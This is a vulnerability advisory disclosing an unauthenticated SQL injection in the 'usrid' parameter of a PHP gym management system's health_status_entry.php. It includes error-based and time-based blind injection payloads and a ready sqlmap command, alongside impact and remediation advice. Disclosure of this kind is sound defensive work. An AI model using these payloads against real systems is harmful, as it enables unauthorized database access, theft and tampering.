# **Security Advisory: SQL Injection in CodeZips Gym Management System (PHP) v1.0**
**Discovered By:** <font style="color:rgb(51, 51, 51);">WeQi</font>

---

## **Affected Product**
+ **Product Name**: Gym Management System in PHP with Source Code  
+ **Version**: v1.0  
+ **Vulnerable File**: `/dashboard/admin/health_status_entry.php`  
+ **Parameter**: `usrid`  
+ **Vendor Homepage**: [Gym Management System](https://codezips.com/php/gymmanagementsytem/)  
+ **Download Link**: [Source Code](https://codeload.github.com/codezips/gym-management-system-php/zip/master)

**No authentication required** to exploit this vulnerability.

---

## **Overview**
A critical SQL injection vulnerability exists in the `usrid` parameter within `/dashboard/admin/health_status_entry.php`. Attackers can inject arbitrary SQL code via specially crafted values, bypassing input validation. This could lead to unauthorized database access, data manipulation, and potentially full system compromise.

---

## **Technical Details**
### Vulnerability Type
+ **SQL Injection**   
    - Error-based  
    - Time-based blind

###  Sample Payloads
```bash

# error-based
usrid=1529336794' AND GTID_SUBSET(CONCAT(0x716a787071,(SELECT (ELT(1368=1368,1))),0x71627a7171),1368) AND 'rZfT'='rZfT&calorie=111&height=111&weight=111&fat=11&remarks=111&submit=SUBMIT

# time-based blind
usrid=1529336794' AND (SELECT 4363 FROM (SELECT(SLEEP(5)))RoxG) AND 'DvDr'='DvDr&calorie=111&height=111&weight=111&fat=11&remarks=111&submit=SUBMIT

```

### Proof of Concept (PoC)
```bash
sqlmap -u "192.168.10.5:2227/dashboard/admin/health_status_entry.php" --data="usrid=1529336794&calorie=111&height=111&weight=111&fat=11&remarks=111&submit=SUBMIT" --cookie="PHPSESSID=h177n9r00khd5at2r3f9oop7un" --batch --level=5 --risk=3 --dbms=mysql --tamper=space2comment
```

**Screenshots**:



![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1738767687962-d25b0234-88fc-453d-b1fd-6a2a07fd14eb.png)

---

## Impact
+ **Database Compromise**: Attackers can read, modify, or delete data.  
+ **Data Leakage**: Sensitive customer/payment information could be exposed.  
+ **System Interruption**: Malicious queries may degrade performance or crash the application.  
+ **Privilege Escalation**: Potential elevation of privileges leading to broader system takeover.

---

## **Recommendations**
1. **Use Prepared Statements / Parameter Binding**  
    - Separate SQL logic from user-supplied data to prevent code injection.
2. **Enforce Strict Input Validation**  
    - Validate and sanitize incoming fields (`usrid`) against unexpected characters or formats.
3. **Apply the Principle of Least Privilege**  
    - Configure database users with minimal privileges. Avoid high-privilege accounts for routine queries.
4. **Schedule Regular Security Audits**  
    - Conduct routine code reviews, penetration testing, and dependency checks to catch new or recurring flaws.

---

## **References**
+ [Gym Management System Homepage](https://codezips.com/php/gymmanagementsytem/)  
+ [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)  
+ [sqlmap Project](https://sqlmap.org/)

---

**Disclaimer:**  
This advisory is intended for responsible disclosure. Any unauthorized exploitation of the described vulnerability may violate applicable laws. Stakeholders and the vendor are strongly encouraged to apply remediation measures immediately to ensure data protection and maintain system integrity.

